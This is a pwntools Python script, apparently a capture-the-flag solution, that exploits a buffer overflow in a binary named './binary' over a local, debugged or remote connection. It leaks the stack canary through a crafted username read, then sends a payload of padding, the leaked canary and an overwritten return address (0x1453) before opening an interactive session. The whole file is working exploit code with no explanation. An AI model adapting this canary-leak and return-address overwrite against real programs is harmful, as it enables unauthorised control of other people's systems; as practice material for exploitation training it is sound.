from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
b*0x000000000040145a
continue
'''.format(**locals())


exe = './binary' #change this
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

io.sendlineafter(b'>', b'2')
io.sendlineafter(b'username', b'32')
io.sendlineafter(b'Username', b'A' * 16)
io.recvuntil(b'user: ')
io.recv(24)
leaked_canary = u64(io.recv(8))
io.sendlineafter(b'>', b'1')

payload = flat(
    b'A' * 24,
    leaked_canary,
    b'A' * 8,
    0x1453
    )

io.sendlineafter(b'Username:', payload)
io.sendlineafter(b'Password:', b'A')
log.info(hex(leaked_canary))
io.interactive()